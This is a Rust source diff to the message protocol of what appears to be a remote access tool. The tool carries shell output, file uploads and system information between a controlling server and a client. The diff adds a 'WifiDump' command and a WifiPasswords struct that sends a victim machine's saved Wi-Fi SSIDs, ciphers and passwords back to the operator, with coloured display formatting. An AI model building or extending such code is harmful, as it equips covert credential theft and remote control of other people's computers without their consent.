@@ -1,15 +1,32 @@
 use serde::{Deserialize, Serialize};
 pub mod utils;
+use std::fmt;
 
+pub const RESET: &str = "\x1b[0m";
+pub const DIM: &str = "\x1b[2m";
+pub const BOLD: &str = "\x1b[1m";
+pub const GREEN: &str = "\x1b[32m";
+pub const YELLOW: &str = "\x1b[33m";
+pub const RED: &str = "\x1b[31m";
+pub const CYAN: &str = "\x1b[36m";
+pub const WHITE: &str = "\x1b[97m";
 pub const FILE_CHUNK_SIZE: usize = 64 * 1024;
 
 // Client/Server messages
 #[derive(Serialize, Deserialize)]
 pub enum ClientMessage {
+    // System
     SystemInformation(SystemInformation),
+    WifiDump(Vec<WifiPasswords>),
+
+    // File system
     FileHandler(FileHeader),
+
+    // Exec
     ShellOutput(ShellOutput),
     ShellDone,
+
+    // Mic
     Pong,
     Error(String),
 }
@@ -18,6 +35,7 @@ pub enum ClientMessage {
 pub enum InstructMessage {
     // System
     SysInfo,
+    WifiDump,
     Check,
     Display(Display),
 
@@ -30,6 +48,27 @@ pub enum InstructMessage {
     Upload,
 
     Close,
+}
+
+#[derive(Serialize, Deserialize)]
+pub struct WifiPasswords {
+    pub ssid: String,
+    pub chiper: String,
+    pub password: String,
+}
+
+impl fmt::Display for WifiPasswords {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        write!(
+            f,
+            "{}SSID:{} {}{}\n\
+             {}Cipher:{} {}{}\n\
+             {}Password:{} {}{}",
+            CYAN, RESET, WHITE, self.ssid,
+            CYAN, RESET, YELLOW, self.chiper,
+            CYAN, RESET, GREEN, self.password
+        )
+    }
 }
 
 #[derive(Serialize, Deserialize)]
